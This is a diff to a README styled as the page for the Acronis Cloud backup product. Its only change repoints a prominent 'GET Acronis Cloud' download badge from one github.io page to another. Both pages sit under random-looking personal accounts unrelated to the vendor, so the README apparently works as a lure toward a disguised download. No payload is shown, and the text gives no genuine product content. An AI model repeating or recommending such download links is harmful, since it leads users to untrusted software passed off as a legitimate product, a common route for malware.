@@ -1,6 +1,6 @@
 # Acronis Cloud - Cloud Backup, Cyber Protection, and Recovery Platform
 
-[![GET Acronis Cloud](https://img.shields.io/badge/GET%20%E2%80%94%20Acronis%20Cloud-0078D6?style=for-the-badge&logoColor=white)](https://bodenbishopocfv.github.io/.github/acronis-cloud)
+[![GET Acronis Cloud](https://img.shields.io/badge/GET%20%E2%80%94%20Acronis%20Cloud-0078D6?style=for-the-badge&logoColor=white)](https://elliotdillonrluv.github.io/.github/acronis-cloud-storage)
 
 ## Acronis Cloud Service Overview
 
